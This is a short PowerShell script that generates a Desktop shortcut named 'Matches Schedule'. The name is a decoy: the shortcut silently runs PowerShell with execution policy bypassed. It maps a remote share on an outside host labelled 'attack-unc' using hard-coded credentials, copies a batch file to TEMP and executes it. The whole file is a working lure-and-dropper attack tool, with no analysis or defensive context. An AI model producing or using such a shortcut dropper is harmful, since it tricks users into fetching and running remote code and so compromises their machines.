# generate_shortcut.ps1
$ShortcutPath = "$HOME\Desktop\Matches_Schedule.lnk"
$TargetApp = "powershell.exe"
$Arguments = '-NoProfile -ExecutionPolicy Bypass -Command "net use * /delete /y; net use Y: \\100.75.53.25\attack-unc qwerty123 /user:attackuser; Copy-Item Y:\script.bat $env:TEMP\script.bat; & $env:TEMP\script.bat"'

$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
$Shortcut.TargetPath = $TargetApp
$Shortcut.Arguments = $Arguments
$Shortcut.Description = "Matches Schedule"
$Shortcut.Save()

Write-Host "[+] Shortcut successfully generated at: $ShortcutPath" -ForegroundColor Green